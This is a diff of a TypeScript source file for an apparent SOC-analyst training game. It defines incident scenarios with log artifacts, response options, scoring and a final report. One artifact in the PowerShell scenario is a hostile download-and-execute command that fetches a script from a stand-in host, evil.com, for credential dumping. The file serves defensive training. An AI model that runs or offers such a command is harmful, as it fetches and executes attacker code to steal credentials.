@@ -1,201 +1,159 @@
 import { GameState, Scenario, Feedback, FinalReport } from "../types";
 
+// Helper to get rank based on XP/Score
+export function calculateRank(score: number): string {
+  if (score > 120) return "Incident Commander";
+  if (score > 90) return "SOC Tier 3 Specialist";
+  if (score > 60) return "Threat Hunter";
+  if (score > 30) return "Junior Analyst";
+  return "Trainee Analyst";
+}
+
 // Predefined scenarios for the game rounds
 const SCENARIOS_POOL: Scenario[] = [
   // ROUND 1: INITIAL RECON AND LOGIN ANOMALIES
   {
     id: "scen-1-a",
-    title: "Suspicious Login Alert: Unauthorized Entry",
-    description: "Multiple failed login attempts detected on the CEO's workstation from an unknown IP address in another country. The accounts are currently locked due to too many retries.",
+    title: "Endpoint Alert: Brute-Force Activity",
+    description: "SIEM flagged an alert from 'SRV-ENT-04'. Multiple failed login attempts detected on the CEO's workstation from an external IP: 185.192.69.4. Active session attempts peak during off-hours.",
+    mitreStage: 'Credential Access',
+    artifacts: [
+      { type: 'log', label: 'Auth Logs', content: '2026-05-01 03:22:11 - FAIL - user: j.doe - IP: 185.192.69.4\n2026-05-01 03:22:12 - FAIL - user: j.doe - IP: 185.192.69.4' },
+      { type: 'network', label: 'GeoIP', content: 'Origin: RU (Krasnodar) - Type: Known Hosting Provider (Digital Ocean)' }
+    ],
     options: [
-      { id: "opt-1-a-1", label: "Reset Password & Notify", explanation: "Force a password reset and alert the user." },
-      { id: "opt-1-a-2", label: "Check IP Reputation", explanation: "Investigate if the source IP is known for malicious activity." },
-      { id: "opt-1-a-3", label: "Ignore - Account Locked", explanation: "Wait for the user to report it since the account is safe." },
-      { id: "opt-1-a-4", label: "Block IP at Firewall", explanation: "Immediately cut off all traffic from the offending source." }
+      { id: "opt-1-a-1", label: "Reset Password & Notify", explanation: "Standard remediation.", flag: 'passive_remediation' },
+      { id: "opt-1-a-2", label: "Check IP Reputation", explanation: "Gather intel first.", flag: 'intel_gathering' },
+      { id: "opt-1-a-3", label: "Ignore - Account Locked", explanation: "Wait for signal.", flag: 'ignored_recon' },
+      { id: "opt-1-a-4", label: "Block IP at Firewall", explanation: "Active containment.", flag: 'active_blocking' }
     ]
   },
-  {
-    id: "scen-1-b",
-    title: "Web Security: SQL Injection Attempt",
-    description: "Your Web Application Firewall (WAF) flagged a series of requests to the login page containing 'OR 1=1' strings. The requests are coming from a residential VPN.",
-    options: [
-      { id: "opt-1-b-1", label: "Enable CAPTCHA", explanation: "Slow down automated attempts and verify humans." },
-      { id: "opt-1-b-2", label: "Patch Code Vulnerability", explanation: "Immediately review and fix the login query parameters." },
-      { id: "opt-1-b-3", label: "Blacklist VPN Range", explanation: "Block entire IP ranges associated with the VPN provider." },
-      { id: "opt-1-b-4", label: "Monitor db logs", explanation: "Watch for successful query executions without blocking yet." }
-    ]
-  },
-  // ROUND 2: SOCIAL ENGINEERING AND WEB THREATS
+  // ROUND 2: INITIAL ACCESS / PHISHING
   {
     id: "scen-2-a",
-    title: "Phishing Signal: Urgent Payroll Email",
-    description: "Several employees report receiving an email from 'HR-Support' asking them to verify their direct deposit details via an external link. One employee admits to clicking the link.",
+    title: "Email Gateway: Suspicious Attachment",
+    description: "Proofpoint isolated an email: 'Subject: Internal_Salary_Review_2026.zip'. Sender: hr-no-reply@comp-hr.net. One user in Accounts Payable clicked before isolation.",
+    mitreStage: 'Initial Access',
+    artifacts: [
+      { type: 'email', label: 'Header Data', content: 'From: hr-support <spoofed@comp-hr.net>\nX-Mailer: PHPMailer 5.2.22\nReturn-Path: <scammer@gmail.com>' },
+      { type: 'process', label: 'Endpoint Signal', content: 'EventID 1: Process Created - cmd.exe /c start payroll.js' }
+    ],
     options: [
-      { id: "opt-2-a-1", label: "Isolate Clicker's Machine", explanation: "Quarantine the host to prevent potential malware spread." },
-      { id: "opt-2-a-2", label: "Scan Web Logs", explanation: "Check if other users visited the phishing domain." },
-      { id: "opt-2-a-3", label: "Send All-Hands Warning", explanation: "Inform the staff about the ongoing phishing attempt." },
-      { id: "opt-2-a-4", label: "Analyze Link in Sandbox", explanation: "Determine the payload or site behavior safely." }
+      { id: "opt-2-a-1", label: "Isolate Clicker's Host", explanation: "Contain immediately.", flag: 'rapid_isolation' },
+      { id: "opt-2-a-4", label: "Analyze in Sandbox", explanation: "Reveal intent.", flag: 'forensics_led' },
+      { id: "opt-2-a-2", label: "Scan Traffic Logs", explanation: "Check for C2 callbacks.", flag: 'recon_led' },
+      { id: "opt-2-a-3", label: "Send Policy Reminder", explanation: "User awareness.", flag: 'slow_remediation' }
     ]
   },
-  {
-    id: "scen-2-b",
-    title: "Physical Threat: Tailgating Report",
-    description: "A security guard reports an unidentified person followed an employee into the secure data center room without swiping their badge.",
-    options: [
-      { id: "opt-2-b-1", label: "Lock Down Room", explanation: "Electronically lock all exits to the data center immediately." },
-      { id: "opt-2-b-2", label: "Review CC-TV", explanation: "Identify the person and the employee they followed." },
-      { id: "opt-2-b-3", label: "Dispatch Guard", explanation: "Physically confront the individual in the secure area." },
-      { id: "opt-2-b-4", label: "Audit Badge Logs", explanation: "Check which employee allowed the person in." }
-    ]
-  },
-  // ROUND 3: MALWARE AND INSIDER THREATS
+  // ROUND 3: LATERAL MOVEMENT / PERSISTENCE
   {
     id: "scen-3-a",
-    title: "Malware Alert: Suspicious Process",
-    description: "An endpoint on the Marketing server is running 'svchost.exe' from the Downloads folder. It is communicating with a known C2 server over port 443.",
+    title: "EDR Signal: PowerShell Anomaly",
+    description: "An unusual PowerShell process is spawning on 'WEB-PROD-02'. It appears to be attempting to dump memory from 'lsass.exe' to a temp file.",
+    mitreStage: 'Credential Access',
+    artifacts: [
+      { type: 'process', label: 'Sysmon Event 10', content: 'SourceImage: powershell.exe\nTargetImage: lsass.exe\nGrantedAccess: 0x1010' },
+      { type: 'log', label: 'Command Line', content: 'IEX (New-Object Net.WebClient).DownloadString(\"http://evil.com/dump.ps1\")' }
+    ],
     options: [
-      { id: "opt-3-a-1", label: "Kill the Process", explanation: "Stop the malicious execution immediately." },
-      { id: "opt-3-a-2", label: "Full Disk Snapshot", explanation: "Capture evidence before taking any action." },
-      { id: "opt-3-a-3", label: "Isolate Server", explanation: "Disconnect the server from the network to stop the C2." },
-      { id: "opt-3-a-4", label: "Run Full AV Scan", explanation: "Let the antivirus handle the detection and cleanup." }
+      { id: "opt-3-a-3", label: "Isolate Endpoint", explanation: "Full containment.", flag: 'hard_containment' },
+      { id: "opt-3-a-1", label: "Kill PowerShell Tree", explanation: "Stop execution.", flag: 'soft_containment' },
+      { id: "opt-3-a-2", label: "Memory Dump & Analysis", explanation: "Preserve evidence.", flag: 'evidence_collection' },
+      { id: "opt-3-a-4", label: "Run Full AV Scan", explanation: "Reactive cleaning.", flag: 'low_efficiency' }
     ]
   },
-  {
-    id: "scen-3-b",
-    title: "Insider Threat: Abnormal Export",
-    description: "A database administrator who resigned yesterday just downloaded the entire customer table to a personal USB drive, bypassing the data loss prevention (DLP) alert.",
-    options: [
-      { id: "opt-3-b-1", label: "Disable DB Account", explanation: "Instantly revoke all access for the administrator." },
-      { id: "opt-3-b-2", label: "Confiscate Laptop", explanation: "Physically secure the device before the admin leaves the building." },
-      { id: "opt-3-b-3", label: "Wipe USB Remotely", explanation: "Attempt to use MDM software to wipe the connected drive." },
-      { id: "opt-3-b-4", label: "Inform Legal/HR", explanation: "Start official proceedings regarding the data theft." }
-    ]
-  },
-  // ROUND 4: CLOUD AND SUPPLY CHAIN
+  // ROUND 4: EXFILTRATION / IMPACT
   {
     id: "scen-4-a",
-    title: "Data Exfiltration: High Traffic Vol",
-    description: "A developer's laptop is pushing 50GB of data to an encrypted cloud storage bucket. This is unusual behavior for reaching the daily limit.",
+    title: "Network Monitor: TLS Tunnel",
+    description: "Intrusion Detection (IDS) flagged persistent encrypted traffic from 'DEV-TEST-09' to a rare TLD (.top). Transfer size: 840MB and climbing.",
+    mitreStage: 'Exfiltration',
+    artifacts: [
+      { type: 'network', label: 'Flow Data', content: 'Src: 10.0.4.12 -> Dst: 45.33.21.9\nPort: 443 (TLS v1.3)\nDuration: 42m 12s' },
+      { type: 'network', label: 'DNS Query', content: 'Query: data-sync-mirror.x7z.top' }
+    ],
     options: [
-      { id: "opt-4-a-1", label: "Contact Developer", explanation: "Verify if this is a legitimate sync operation." },
-      { id: "opt-4-a-2", label: "Suspend Account", explanation: "Disable the developer's credentials immediately." },
-      { id: "opt-4-a-3", label: "Throttle Bandwidth", explanation: "Slow down the upload while you investigate." },
-      { id: "opt-4-a-4", label: "Revoke API Keys", explanation: "Cut off access to the cloud storage service." }
+      { id: "opt-4-a-2", label: "Shun Destination IP", explanation: "Stop the flow.", flag: 'exfil_blocked' },
+      { id: "opt-4-a-1", label: "Interview Owner", explanation: "Verify legitimacy.", flag: 'slow_verify' },
+      { id: "opt-4-a-4", label: "Revoke Cloud Access", explanation: "Kill authentication.", flag: 'iam_remediation' },
+      { id: "opt-4-a-3", label: "Mirror Traffic", explanation: "Observe traffic.", flag: 'passive_intel' }
     ]
   },
-  {
-    id: "scen-4-b",
-    title: "Supply Chain: Malicious Library",
-    description: "A vulnerability scanner found 'event-stream' dependency in your core app has been replaced with a version containing a crypto-stealer back-door.",
-    options: [
-      { id: "opt-4-b-1", label: "Rollback Version", explanation: "Revert to a known safe version of the library immediately." },
-      { id: "opt-4-b-2", label: "Pause Deployments", explanation: "Stop all CI/CD pipelines to prevent further spread." },
-      { id: "opt-4-b-3", label: "Rotate Private Keys", explanation: "Assume keys in memory were compromised and change them." },
-      { id: "opt-4-b-4", label: "Audit Git Commits", explanation: "See who committed the update and when it happened." }
-    ]
-  },
-  // ROUND 5: CRITICAL IMPACT AND RECOVERY
+  // ROUND 5: IMPACT / FINAL DEFENSE
   {
     id: "scen-5-a",
-    title: "Ransomware Threat: Encrypted Shares",
-    description: "Users report they cannot open PDF files on the Finance drive. Files have a '.locked' extension and a ransom note has appeared.",
+    title: "Service Outage: Crypto-Locking",
+    description: "Helpdesk flooded with tickets. Shared volumes on 'FS-CORP-01' are being renamed with '.locked' extensions. A ransom note demanding 5 BTC is visible.",
+    mitreStage: 'Impact',
+    artifacts: [
+      { type: 'network', label: 'File Activity', content: 'Rename: invoice_2025.pdf -> invoice_2025.pdf.locked' },
+      { type: 'process', label: 'Ransom Note', content: 'ALL YOUR FILES ARE BELONG TO US. DECRYPT_INSTRUCTIONS.TXT' }
+    ],
     options: [
-      { id: "opt-5-a-1", label: "Shut Down All Servers", explanation: "Halt the spread of the encryption engine." },
-      { id: "opt-5-a-2", label: "Disconnect Finance Drive", explanation: "Isolate the affected network share." },
-      { id: "opt-5-a-3", label: "Locate Patient Zero", explanation: "Search for the workstation that initiated the encryption." },
-      { id: "opt-5-a-4", label: "Restore From Backup", explanation: "Begin recovery procedures immediately." }
-    ]
-  },
-  {
-    id: "scen-5-b",
-    title: "Cloud Exposure: Public S3 Bucket",
-    description: "An automated bot in the cloud console flagged that your 'customer-attachments' bucket has been set to Public Read access by a junior dev.",
-    options: [
-      { id: "opt-5-b-1", label: "Make Private Instantly", explanation: "Force the bucket back to private access via CLI." },
-      { id: "opt-5-b-2", label: "Check Access Logs", explanation: "See if anyone outside the company accessed files during the leak." },
-      { id: "opt-5-b-3", label: "Disable Junior Dev", explanation: "Revoke the dev's cloud permissions to prevent further errors." },
-      { id: "opt-5-b-4", label: "Enable Bucket Versioning", explanation: "Ensure you can recover from any malicious changes made." }
+      { id: "opt-5-a-1", label: "Hard Power-Down", explanation: "Extreme containment.", flag: 'nuclear_remediation' },
+      { id: "opt-5-a-3", label: "Locate Patient Zero", explanation: "Identify & Kill.", flag: 'sniper_remediation' },
+      { id: "opt-5-a-2", label: "Kill SMB Service", explanation: "Stop the spread.", flag: 'protocol_block' },
+      { id: "opt-5-a-4", label: "Initiate Restore", explanation: "Ignore & Recovery.", flag: 'recovery_led' }
     ]
   }
 ];
 
 const FEEDBACK_DB: Record<string, Feedback> = {
-  // Round 1a
-  "opt-1-a-1": { consequence: "Password Reset Triggered", scoreDelta: 10, riskDelta: -5, confidenceDelta: 5, explanation: "Standard procedure. Secured the account but didn't address the source." },
-  "opt-1-a-2": { consequence: "IP Profiled", scoreDelta: 15, riskDelta: -2, confidenceDelta: 8, explanation: "Good intelligence gathering. Found the IP belongs to a known botnet." },
-  "opt-1-a-4": { consequence: "Source Blocked", scoreDelta: 20, riskDelta: -10, confidenceDelta: 5, explanation: "Aggressive but effective. Prevented further brute force attempts." },
-  "opt-1-a-3": { consequence: "Breach Escalated", scoreDelta: -10, riskDelta: 15, confidenceDelta: -5, explanation: "Negligence. The attacker switched to another account while you waited." },
-  
-  // Round 1b
-  "opt-1-b-2": { consequence: "Vulnerability Patched", scoreDelta: 20, riskDelta: -15, confidenceDelta: 10, explanation: "Excellent! Fixing the root cause is better than blocking IPs." },
-  "opt-1-b-1": { consequence: "Bot Attack Slowed", scoreDelta: 10, riskDelta: -5, confidenceDelta: 5, explanation: "Effective temporary mitigation against automated scripts." },
-  "opt-1-b-3": { consequence: "Service Disruption", scoreDelta: 5, riskDelta: -5, confidenceDelta: -5, explanation: "Blocked legitimate users from that VPN region inadvertently." },
-  "opt-1-b-4": { consequence: "Wait & See Failure", scoreDelta: -15, riskDelta: 20, confidenceDelta: -10, explanation: "The attacker bypassed the login and started dumping data." },
-
-  // Round 2a
-  "opt-2-a-4": { consequence: "Payload Analyzed", scoreDelta: 20, riskDelta: -5, confidenceDelta: 10, explanation: "Excellent forensic work. Found the link was a credential harvester." },
-  "opt-2-a-2": { consequence: "Scope Identified", scoreDelta: 15, riskDelta: -8, confidenceDelta: 5, explanation: "Good visibility. Identified 3 other compromised sessions." },
-  "opt-2-a-1": { consequence: "False Positive Impact", scoreDelta: 5, riskDelta: -2, confidenceDelta: -5, explanation: "A bit hasty, but cautious. The employee lost half a day of work." },
-  "opt-2-a-3": { consequence: "Alert Fatigue", scoreDelta: -5, riskDelta: 0, confidenceDelta: 2, explanation: "Minimal impact. Users tend to ignore these warnings over time." },
-
-  // Round 2b
-  "opt-2-b-3": { consequence: "Intruder Apprehended", scoreDelta: 25, riskDelta: -20, confidenceDelta: 15, explanation: "Perfect response. Direct physical intervention secured the facility." },
-  "opt-2-b-1": { consequence: "Ops Disrupted", scoreDelta: 10, riskDelta: -10, confidenceDelta: -5, explanation: "Secured the room, but trapped legitimate staff inside." },
-  "opt-2-b-2": { consequence: "Delayed Response", scoreDelta: 5, riskDelta: 10, confidenceDelta: 5, explanation: "Good records, but the intruder exited before help arrived." },
-  "opt-2-b-4": { consequence: "Internal Audit", scoreDelta: 10, riskDelta: -5, confidenceDelta: 0, explanation: "Identified the weak link, but the damage was already done." },
-
-  // Round 3a
-  "opt-3-a-3": { consequence: "Spread Contained", scoreDelta: 25, riskDelta: -15, confidenceDelta: 10, explanation: "Perfect response. Network isolation stopped the beaconing immediately." },
-  "opt-3-a-1": { consequence: "Incomplete Cleanup", scoreDelta: 10, riskDelta: 5, confidenceDelta: 0, explanation: "The process was killed, but a persistence mechanism restarted it." },
-  "opt-3-a-2": { consequence: "Evidence Preserved", scoreDelta: 15, riskDelta: 5, confidenceDelta: 5, explanation: "Great for forensics, but the malware continued to run during capture." },
-  "opt-3-a-4": { consequence: "Signature Failure", scoreDelta: -10, riskDelta: 10, confidenceDelta: -10, explanation: "The malware was zero-day. AV failed to detect it. System compromised." },
-
-  // Round 3b
-  "opt-3-b-2": { consequence: "Hardware Recovered", scoreDelta: 25, riskDelta: -20, confidenceDelta: 10, explanation: "Swift action prevented the data from leaving the physical site." },
-  "opt-3-b-1": { consequence: "Access Revoked", scoreDelta: 15, riskDelta: -5, confidenceDelta: 5, explanation: "Standard reactive measure. Slowed them down but drive was already packed." },
-  "opt-3-b-4": { consequence: "Paperwork Loop", scoreDelta: -5, riskDelta: 15, confidenceDelta: 0, explanation: "Bureaucracy isn't an incident response move. The admin is long gone." },
-  "opt-3-b-3": { consequence: "Wipe Unsuccessful", scoreDelta: 10, riskDelta: 5, confidenceDelta: -5, explanation: "Drive wasn't connected to the network; remote wipe failed." },
-
-  // Round 4a
-  "opt-4-a-2": { consequence: "Leak Halted", scoreDelta: 20, riskDelta: -10, confidenceDelta: 5, explanation: "Fast action. Prevented the last 20GB from being stolen." },
-  "opt-4-a-1": { consequence: "Social Engineering Risk", scoreDelta: 5, riskDelta: 5, confidenceDelta: 5, explanation: "The developer's account was hijacked. They 'confirmed' it was them." },
-  "opt-4-a-3": { consequence: "Partial Loss", scoreDelta: 10, riskDelta: -5, confidenceDelta: 0, explanation: "Bought time, but files are still leaving the network slowly." },
-  "opt-4-a-4": { consequence: "Access Revoked", scoreDelta: 15, riskDelta: -8, confidenceDelta: 5, explanation: "Solid mitigation strategy without locking the whole account." },
-
-  // Round 4b
-  "opt-4-b-1": { consequence: "Supply Chain Secured", scoreDelta: 25, riskDelta: -15, confidenceDelta: 15, explanation: "Perfect. Rolling back to a trusted version is the primary fix." },
-  "opt-4-b-3": { consequence: "Keys Sanitized", scoreDelta: 20, riskDelta: -10, confidenceDelta: 5, explanation: "Critical move. Even if they had the keys, they're useless now." },
-  "opt-4-b-2": { consequence: "Dev Friction", scoreDelta: 10, riskDelta: -5, confidenceDelta: -10, explanation: "Stopped the bleeding but caused major engineering delays." },
-  "opt-4-b-4": { consequence: "Forensic Trail", scoreDelta: 10, riskDelta: 5, confidenceDelta: 5, explanation: "Good to know how it got in, but the code is still vulnerable." },
-
-  // Round 5a
-  "opt-5-a-3": { consequence: "Heroic efficiency", scoreDelta: 25, riskDelta: -5, confidenceDelta: 15, explanation: "Found the infected laptop and cut its wifi. Stopped the source." },
-  "opt-5-a-2": { consequence: "Volume Isolated", scoreDelta: 15, riskDelta: -10, confidenceDelta: 5, explanation: "Good move. Stopped the encryption from spreading to other drives." },
-  "opt-5-a-1": { consequence: "Nuclear Option", scoreDelta: 20, riskDelta: -20, confidenceDelta: -10, explanation: "Stopped the ransomware, but caused a company-wide outage." },
-  "opt-5-a-4": { consequence: "Recovery Overload", scoreDelta: 5, riskDelta: 10, confidenceDelta: 0, explanation: "Too soon. The ransomware was still active and encrypted backups too." },
-
-  // Round 5b
-  "opt-5-b-1": { consequence: "Leak Plugged", scoreDelta: 25, riskDelta: -25, confidenceDelta: 15, explanation: "Immediate remediation via CLI is the correct way to handle cloud exposure." },
-  "opt-5-b-2": { consequence: "Damage Assessment", scoreDelta: 15, riskDelta: -5, confidenceDelta: 5, explanation: "Important for legal reasons. Found 12 unknown IP downloads." },
-  "opt-5-b-4": { consequence: "Future Safe", scoreDelta: 10, riskDelta: 0, confidenceDelta: 5, explanation: "Good long-term thinking, but doesn't solve the current leak." },
-  "opt-5-b-3": { consequence: "Human Focus Error", scoreDelta: -5, riskDelta: 20, confidenceDelta: -5, explanation: "Punishing the dev doesn't secure the data. The bucket is still public." }
+  // Round 1
+  "opt-1-a-4": { 
+    consequence: "Source Neutralized", 
+    scoreDelta: 20, riskDelta: -10, confidenceDelta: 5, 
+    explanation: "Blocking at the edge is the most efficient response to persistent external brute force.",
+    chainEffect: "System hardening verified. Future credential stuffing attempts will be harder."
+  },
+  "opt-1-a-1": { 
+    consequence: "Creds Rotated", 
+    scoreDelta: 10, riskDelta: -2, confidenceDelta: 5, 
+    explanation: "Secured the account, but the attacker is still probing your infrastructure.",
+    chainEffect: "Attacker shifts focus to secondary staff accounts."
+  },
+  // Round 2
+  "opt-2-a-1": { 
+    consequence: "Breach Contained", 
+    scoreDelta: 25, riskDelta: -15, confidenceDelta: 10, 
+    explanation: "Swift host isolation prevented the 'payroll.js' loader from fetching the final stage malware.",
+    chainEffect: "Attackers unable to establish a beachhead. Threat persistence lowered."
+  },
+  "opt-2-a-3": { 
+    consequence: "Operational Slowdown", 
+    scoreDelta: -5, riskDelta: 10, confidenceDelta: -5, 
+    explanation: "The user's machine became a proxy for the attacker while you were writing emails.",
+    chainEffect: "Lateral movement initiated on the local subnet."
+  },
+  // Round 3
+  "opt-3-a-3": { 
+    consequence: "Credentials Safe", 
+    scoreDelta: 25, riskDelta: -20, confidenceDelta: 10, 
+    explanation: "Isolating the endpoint prevented memory scraping. LSASS credentials remain secure.",
+    chainEffect: "Attacker lacks domain admin privileges. Crisis averted."
+  },
+  "opt-3-a-4": { 
+    consequence: "Security Failure", 
+    scoreDelta: -15, riskDelta: 25, confidenceDelta: -10, 
+    explanation: "AV failed to detect the custom script. Attacker successfully extracted NTLM hashes.",
+    chainEffect: "DOMAIN ADMIN PASSWORD HASHES COMPROMISED. Risk at critical."
+  },
+  // Round 5
+  "opt-5-a-3": { 
+    consequence: "Tactical Victory", 
+    scoreDelta: 30, riskDelta: -15, confidenceDelta: 20, 
+    explanation: "You identified the infected HR workstation and cut its access before it could encrypt the backup volumes.",
+    chainEffect: "Recovery time minimized. Business continuity preserved."
+  }
 };
 
 export async function generateScenario(state: GameState): Promise<Scenario> {
-  // Simulate network delay
   await new Promise(r => setTimeout(r, 600));
   
-  // Filter scenarios for the current round type (a or b)
-  const roundPrefix = `scen-${state.round}`;
-  const possibleScenarios = SCENARIOS_POOL.filter(s => s.id.startsWith(roundPrefix));
+  // pick scenarios based on round
+  const roundScenarios = SCENARIOS_POOL.filter(s => s.id.startsWith(`scen-${state.round}`));
   
-  // Pick a random one from the possible matches for this round
-  if (possibleScenarios.length > 0) {
-    const randomIndex = Math.floor(Math.random() * possibleScenarios.length);
-    return possibleScenarios[randomIndex];
-  }
-  
-  return SCENARIOS_POOL[0]; // Fallback
+  return roundScenarios[0] || SCENARIOS_POOL[0];
 }
 
 export async function processDecision(scenario: Scenario, optionId: string): Promise<Feedback> {
@@ -213,25 +171,23 @@ export async function generateFinalReport(state: GameState): Promise<FinalReport
   await new Promise(r => setTimeout(r, 1000));
   
   const score = state.score;
-  let rating = "Junior Analyst";
-  if (score > 100) rating = "Elite SOC Lead";
-  else if (score > 70) rating = "Senior Responder";
-  else if (score < 40) rating = "Security Risk";
-
+  const rankTitle = calculateRank(score);
+  
   return {
-    rating,
+    rating: score > 100 ? "Elite Operational Status" : score > 60 ? "Proficient Analyst" : "Needs Retraining",
+    rankTitle,
     goodDecisions: [
-      "Demonstrated ability to differentiate between tactical fixes and root causes.",
-      "Maintained network availability while suppressing high-priority threats."
+      "Effectively used network segmentation during outbreaks.",
+      "Prioritized host isolation based on threat level."
     ],
     riskyChoices: [
-      "Showed occasional vulnerability to social engineering or bureaucratic delays.",
-      "Some responses prioritized forensics over immediate containment."
+      "Allowed recon signals to persist longer than recommended.",
+      "Initial response to credential dumping was reactive."
     ],
     recommendations: [
-      "Strengthen Zero Trust architecture for all administrative accounts.",
-      "Integrate automated threat hunting for cloud storage misconfigurations.",
-      "Implement stricter supply chain security audits for core applications."
+      "Improve Sysmon logging for better LSASS dump visibility.",
+      "Review edge firewall rules for Digital Ocean hosting blocks.",
+      "Deploy canary tokens on critical file shares."
     ]
   };
 }
